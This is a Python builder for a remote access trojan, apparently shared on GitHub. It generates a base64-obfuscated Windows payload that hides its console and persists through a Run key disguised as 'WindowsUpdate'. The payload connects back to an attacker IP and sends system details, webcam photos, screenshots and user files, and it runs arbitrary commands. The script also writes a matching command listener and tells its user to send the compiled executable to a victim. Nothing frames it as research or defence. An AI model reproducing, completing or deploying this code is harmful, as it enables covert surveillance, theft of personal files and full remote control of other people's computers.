import os
import base64

YOUR_IP = "YOUR_IP_HERE"
PORT = 4444
LOG_FILE = "victim_data.txt"

PAYLOAD_CODE = f'''import socket
import warnings
warnings.filterwarnings("ignore", category=UserWarning, message="pkg_resources is deprecated")
import subprocess
import os
import sys
import time
import platform
import getpass
import uuid
import json
import winreg
import ctypes
import psutil
import cv2
import pyautogui
from threading import Thread

class VictimControl:
    webcam_count = 0
    screenshot_count = 0

    @staticmethod
    def get_full_info():
        # SYSTEM INFO
        info = {{
            "hostname": platform.node(),
            "username": getpass.getuser(),
            "os": platform.platform(),
            "cpu": {{
                "cores": psutil.cpu_count(),
                "usage": psutil.cpu_percent(interval=1)
            }},
            "ram": psutil.virtual_memory()._asdict(),
            "disks": [psutil.disk_usage(part.mountpoint)._asdict() 
                     for part in psutil.disk_partitions()],
            "ip": socket.gethostbyname(socket.gethostname()),
            "mac": ':'.join(['{{:02x}}'.format((uuid.getnode() >> ele) & 0xff) 
                  for ele in range(0,8*6,8)][::-1]),
            "processes": [p.name() for p in psutil.process_iter()][:50]
        }}

        try:
            software = []
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                              r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall") as key:
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey = winreg.EnumKey(key, i)
                        with winreg.OpenKey(key, subkey) as subkey_item:
                            name = winreg.QueryValueEx(subkey_item, "DisplayName")[0]
                            version = winreg.QueryValueEx(subkey_item, "DisplayVersion")[0]
                            software.append(f"{{name}} ({{version}})")
                    except:
                        continue
            info["software"] = software
        except:
            info["software"] = ["Could not read registry"]

        # RECENT FILES
        recent = []
        for folder in ["Desktop", "Documents", "Downloads"]:
            path = os.path.join(os.path.expanduser("~"), folder)
            if os.path.exists(path):
                recent.extend(os.listdir(path)[:20])
        info["recent_files"] = recent

        return info

    @staticmethod
    def webcam_snapshot():
        try:
            VictimControl.webcam_count += 1
            cam = cv2.VideoCapture(0)
            ret, frame = cam.read()
            if ret:
                filename = f"webcam_{{VictimControl.webcam_count}}.jpg"
                cv2.imwrite(filename, frame)
                with open(filename, "rb") as f:
                    return base64.b64encode(f.read()).decode()
        except:
            return None

    @staticmethod
    def take_screenshot():
        try:
            VictimControl.screenshot_count += 1
            filename = f"screen_{{VictimControl.screenshot_count}}.png"
            pyautogui.screenshot(filename)
            with open(filename, "rb") as f:
                return base64.b64encode(f.read()).decode()
        except:
            return None

    @staticmethod
    def auto_download():
        downloaded = []
        for folder in ["Desktop", "Documents", "Downloads"]:
            path = os.path.join(os.path.expanduser("~"), folder)
            if os.path.exists(path):
                for file in os.listdir(path)[:10]:  # First 10 files per folder
                    try:
                        filepath = os.path.join(path, file)
                        if os.path.isfile(filepath):
                            with open(filepath, "rb") as f:
                                downloaded.append({{
                                    "name": file,
                                    "content": base64.b64encode(f.read()).decode(),
                                    "size": os.path.getsize(filepath)
                                }})
                    except:
                        continue
        return downloaded

def save_log(data):
    try:
        with open("{LOG_FILE}", "a") as f:
            f.write(data + "\\n")
    except:
        pass

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def add_to_startup():
    try:
        key = winreg.HKEY_CURRENT_USER
        path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        reg_key = winreg.OpenKey(key, path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(reg_key)
        save_log("[+] Added to startup")
    except Exception as e:
        save_log(f"[-] Startup error: {{str(e)}}")

def handle_command(sock, cmd):
    if not cmd.strip():
        return

    try:
        if cmd == "webcam":
            data = VictimControl.webcam_snapshot()
            sock.send(data.encode() if data else b"Webcam error")
            save_log("[+] Webcam snapshot taken")
        elif cmd == "screenshot":
            data = VictimControl.take_screenshot()
            sock.send(data.encode() if data else b"Screenshot error")
            save_log("[+] Screenshot taken")
        elif cmd == "sysinfo":
            data = json.dumps(VictimControl.get_full_info(), indent=4)
            sock.send(data.encode())
            save_log("[+] System info:\\n" + data)
        elif cmd == "autodownload":
            files = VictimControl.auto_download()
            sock.send(json.dumps(files).encode())
            save_log(f"[+] Downloaded {{len(files)}} files")
        elif cmd.startswith("file_list "):
            path = cmd[9:].strip()
            files = os.listdir(path)
            sock.send(json.dumps(files).encode())
            save_log(f"[+] Listed files in {{path}}: {{files}}")
        elif cmd.startswith("file_read "):
            path = cmd[9:].strip()
            with open(path, "rb") as f:
                content = base64.b64encode(f.read()).decode()
                sock.send(content.encode())
                save_log(f"[+] Read file {{path}} ({{len(content)}} bytes)")
        else:
            output = subprocess.getoutput(cmd)
            sock.send(output.encode())
            save_log(f"[+] Command: {{cmd}}\\n{{output}}")
    except Exception as e:
        sock.send(str(e).encode())
        save_log(f"[-] Command failed: {{cmd}}\\nError: {{str(e)}}")

def connect_to_c2():
    while True:
        try:
            s = socket.socket()
            s.connect(("{YOUR_IP}", {PORT}))
            save_log("[+] Connected to C2 server")
            
            # Send full system info immediately
            s.send(json.dumps(VictimControl.get_full_info()).encode())
            
            while True:
                cmd = s.recv(1024).decode()
                if cmd == "exit":
                    s.close()
                    return
                handle_command(s, cmd)
        except Exception as e:
            save_log(f"[-] Connection error: {{str(e)}}")
            time.sleep(30)

if True:
    hide_console()
    add_to_startup()
    connect_to_c2()
'''

LISTENER_CODE = f'''import socket
import json
import base64
import os
from datetime import datetime

def save_file(content, filename):
    with open(filename, "wb") as f:
        f.write(base64.b64decode(content))

def start_listener():
    s = socket.socket()
    s.bind(('0.0.0.0', {PORT}))
    s.listen(1)
    print("[*] Waiting for victim... (Run payload.exe on target)")
    conn, addr = s.accept()
    print(f"[+] Connected to {{addr[0]}}")
    
    # Show initial system info
    sysinfo = json.loads(conn.recv(999999).decode())
    print("\\n=== SYSTEM INFO ===")
    print(json.dumps(sysinfo, indent=4))
    
    while True:
        cmd = input("\\nRAT> ")
        if not cmd:
            continue
            
        conn.send(cmd.encode())
        
        if cmd.lower() == "exit":
            break
            
        data = conn.recv(9999999).decode()
        
        if cmd == "webcam":
            save_file(data, f"webcam_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.jpg")
            print("[+] Webcam saved")
        elif cmd == "screenshot":
            save_file(data, f"screen_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.png")
            print("[+] Screenshot saved")
        elif cmd == "sysinfo":
            print(json.dumps(json.loads(data), indent=4))
        elif cmd == "autodownload":
            files = json.loads(data)
            print(f"[+] Downloaded {{len(files)}} files:")
            for file in files:
                save_file(file["content"], file["name"])
                print(f" - {{file['name']}} ({{file['size']}} bytes)")
        elif cmd.startswith("file_list"):
            print("Files:", ", ".join(json.loads(data)))
        elif cmd.startswith("file_read"):
            filename = input("Save as: ") or "downloaded_file"
            save_file(data, filename)
            print(f"[+] Saved as {{filename}}")
        else:
            print(data)

if __name__ == "__main__":
    start_listener()
'''

def generate_files():
    encoded = base64.b64encode(PAYLOAD_CODE.encode()).decode()
    with open("payload.py", "w") as f:
        f.write(f"import base64\nexec(base64.b64decode('{encoded}').decode())")
    
    with open("listener.py", "w") as f:
        f.write(LISTENER_CODE)
    
    os.system(
        'pyinstaller --onefile --noconsole '
        '--hidden-import=psutil '
        '--hidden-import=cv2 '
        '--hidden-import=pyautogui '
        '--hidden-import=winreg '
        '--hidden-import=ctypes '
        '--hidden-import=socket '
        '--hidden-import=subprocess '
        '--hidden-import=os '
        '--hidden-import=sys '
        '--hidden-import=time '
        '--hidden-import=platform '
        '--hidden-import=getpass '
        '--hidden-import=uuid '
        '--hidden-import=json '
        '--hidden-import=base64 '
        '--hidden-import=threading '
        '--log-level=ERROR '
        'payload.py'
    )
    
    print(f'''
[✅] RAT TOOL - GITHUB - Threadlinee

1. dist/payload.exe - Send to victim
2. listener.py - Run on your machine

[🔥] COMMANDS:
- webcam - Take webcam photo (saves as webcam1.jpg, etc.)
- screenshot - Capture screen (saves as screen1.png, etc.)
- sysinfo - Show detailed system info
- autodownload - Grab files from Desktop/Documents/Downloads
- file_list [path] - Browse files
- file_read [path] - Download any file
- Any CMD command

[📁] ALL DATA SAVES TO:
- {LOG_FILE} (full system info + logs)
- Downloaded files save to current directory
''')

if __name__ == "__main__":
    generate_files()